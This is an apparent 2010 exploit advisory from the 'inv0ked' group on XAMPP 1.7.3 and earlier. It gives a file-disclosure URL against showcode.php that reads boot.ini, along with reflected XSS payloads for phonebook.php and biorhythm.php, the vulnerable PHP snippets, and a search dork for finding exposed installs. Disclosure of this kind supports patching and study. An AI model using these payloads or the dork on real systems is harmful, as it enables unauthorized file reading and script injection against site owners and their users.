@@ -1,0 +1,70 @@
+#     _             ____  __            __    ___ 
+#    (_)____ _   __/ __ \/ /_____  ____/ /  _/_/ |
+#   / // __ \ | / / / / / //_/ _ \/ __  /  / / / /
+#  / // / / / |/ / /_/ / ,< /  __/ /_/ /  / / / / 
+# /_//_/ /_/|___/\____/_/|_|\___/\__,_/  / /_/_/  
+#                   Live by the byte     |_/_/  
+#
+# Members:
+#
+# Pr0T3cT10n
+# -=M.o.B.=-
+# TheLeader
+# Sro
+# Debug
+#
+# Contact: inv0ked.israel@gmail.com
+#
+# -----------------------------------
+#
+# Exploit Title: XAMPP <= 1.7.3 multiple vulnerabilites
+# Date: 31/10/2010
+# Author: TheLeader
+# Software Link: http://www.apachefriends.org/en/xampp-windows.html
+# Affected Version: 1.7.3 and prior
+# Tested on Windows XP Hebrew, Service Pack 3
+# ISRAEL, NULLBYTE.ORG.IL
+#
+# -----------------------------------
+ 
+I. File disclosure
+
+XAMPP is vulnerable to a remote file disclosure attack.
+The vulnerability exists within the web application supplied with XAMPP.
+
+http://[host]/xampp/showcode.php/c:boot.ini?showcode=1
+
+showcode.php:
+<?php
+   echo '<br><br>';
+   if ($_REQUEST['showcode'] != 1) {
+   echo '<a href="'.$_SERVER['PHP_SELF'].'?showcode=1">'.$TEXT['global-showcode'].'</a>';
+   } else {
+       $file = file_get_contents(basename($_SERVER['PHP_SELF']));
+       echo "<h2>".$TEXT['global-sourcecode']."</h2>";
+       echo "<textarea cols='100' rows='10'>";
+       echo htmlspecialchars($file);
+       echo "&lt;/textarea&gt;";
+   }
+?>
+
+showcode.php relies on basename($_SERVER['PHP_SELF']) to retrieve the path.
+What $_SERVER['PHP_SELF'] actually does is retrieve is the path of the requested file.
+basename() parses the last element of that path using "/" as a delimiter.
+
+Traveling through the directory tree, though, requires the "/" character that is used by basename() as a delimiter.
+Therefor directory traveling it is not achieved but it is possible to view file contents from any drive, and the XAMPP htdocs directory.
+
+II. Cross Site Scripting
+
+http://[host]/xampp/phonebook.php/"><script>alert("XSS")</script>
+http://[host]/xampp/biorhythm.php/"><script>alert("XSS")</script>
+
+It is interesting to see the same programming error lead to another security vulnerability.
+Some PHP scripts in the XAMPP dir rely on $_SERVER['PHP_SELF'] for retrieving the "action" tag for HTML forms.
+This can be exploited to perform Cross Site Scripting attacks.
+
+biorhythm.php (line 75):
+<form method="post" action="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+
+dork: "inurl:xampp/biorhythm.php"
